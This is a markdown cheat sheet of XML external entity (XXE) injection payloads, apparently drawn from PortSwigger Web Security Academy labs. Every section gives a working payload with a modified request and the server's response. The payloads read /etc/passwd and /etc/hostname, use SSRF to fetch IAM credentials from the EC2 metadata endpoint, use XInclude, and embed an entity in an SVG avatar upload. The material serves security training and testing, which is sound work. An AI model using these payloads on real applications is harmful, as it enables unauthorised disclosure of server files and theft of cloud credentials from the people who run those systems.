# XML external entity (XXE) injection

>XML external entity injection (also known as XXE) is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any backend or external systems that the application itself can access.


## Summary

- [XML external entity (XXE) injection](#xml-external-entity-xxe-injection)
  - [Summary](#summary)
  - [Exploits](#exploits)
    - [Basic XXE Attack](#basic-xxe-attack)
    - [XXE to SSRF attack](#xxe-to-ssrf-attack)
    - [XXE via XInclude attacks](#xxe-via-xinclude-attacks)
    - [XXE via image file upload](#xxe-via-image-file-upload)
  - [Resources](#resources)


## Exploits

### Basic XXE Attack 

:fire: **Example 1 :**

Request : 

```bash
POST /product/stock HTTP/1.1
Host: sub.web-security-academy.net
User-Agent: Mozilla/5.0 
```
Request Body:

```bash
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
Modified Request Body:

```bash
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
Response:

```bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
```

### XXE to SSRF attack 

:fire: **Example 2 : on a server running a (simulated) EC2 metadata endpoint at the default URL** 

Request : 

```bash
POST /product/stock HTTP/1.1
Host: sub.web-security-academy.net
User-Agent: Mozilla/5.0 
```
Request Body:

```bash
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
Modified Request Body:

```bash
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]><stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

Response:

```bash
"Invalid product ID: {
  "Code" : "Success",
  "LastUpdated" : "2020-04-29T18:31:02.474182Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "SecretKey",
  "SecretAccessKey" : "SecretKey",
  "Token" : "SecretToken",
  "Expiration" : "2026-04-28T18:31:02.474182Z"
}"
```

### XXE via XInclude attacks

:fire: **Example 3 :** 

Request : 

```bash
POST /product/stock HTTP/1.1
Host: sub.web-security-academy.net
User-Agent: Mozilla/5.0 
```
Request Body:

```bash
productId=1&storeId=1
```
Modified Request Body:

```bash
productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
&storeId=1
```

Response:

```bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
```

### XXE via image file upload

:fire: **Example 4 :** 

 Create a local SVG image with the following content: 

 ```bash
<?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>
 ```

 Post a comment on a blog post, and upload this image as an avatar. 

 When you view your comment, you should see the contents of the /etc/hostname file in your image.

 
## Resources

* [PortSwigger](https://portswigger.net/web-security/xxe)